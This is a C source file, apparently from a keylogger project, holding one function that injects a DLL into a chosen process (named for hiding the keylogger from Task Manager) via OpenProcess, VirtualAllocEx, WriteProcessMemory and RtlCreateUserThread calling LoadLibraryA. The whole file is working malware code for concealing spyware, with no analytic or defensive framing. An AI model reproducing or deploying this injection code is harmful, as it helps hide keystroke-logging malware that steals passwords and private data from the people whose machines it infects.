#include "svc.h"


HANDLE HideKeyloggerFromTaskmgr(DWORD procID)
{
    HANDLE hThread;

    if (PathFileExistsA((LPCSTR)DLL_PATH) == FALSE)
    {
        log("unable to find the dll, maybe it was not copied.");
        return NULL;
    }
    HANDLE procHandle = OpenProcess(PROCESS_ALL_ACCESS, TRUE, procID);
    if (procHandle == NULL)
    {
        log("Proc Handle is NULL. OpenProcess failed");
        return NULL;   
    }
    LPVOID baseAddr = VirtualAllocEx(procHandle, NULL, strlen(DLL_PATH) + 1, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (baseAddr == NULL)
    {
        log("baseAddr is NULL. VirtualAllocEx failed");
        return NULL;
    }
    BOOL success = WriteProcessMemory(procHandle, baseAddr, DLL_PATH, strlen(DLL_PATH) + 1, NULL);
    if (success == FALSE)
    {
        log("WriteProcessMemory failed");
        return NULL;
    }
    HMODULE ntdll=LoadLibrary("ntdll.dll");
    RtlCreateUserThread=(_RtlCreateUserThread)((LPVOID)GetProcAddress(ntdll,"RtlCreateUserThread"));
    LPVOID loadLib = (LPVOID)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
    NTSTATUS status = RtlCreateUserThread(
        procHandle,
        NULL,
        FALSE,
        0,
        0,
        0,
        loadLib,
        baseAddr,
        &hThread,
        NULL
    );
    if (NT_SUCCESS(status) == 0)
        log("RtlCreateUserThread failed");
        // printf("RtlCreateUserThread failed: 0x%08X\n", (unsigned int)status);
    log("HideKeyloggerFromTaskmgr successfull");
    return hThread;
}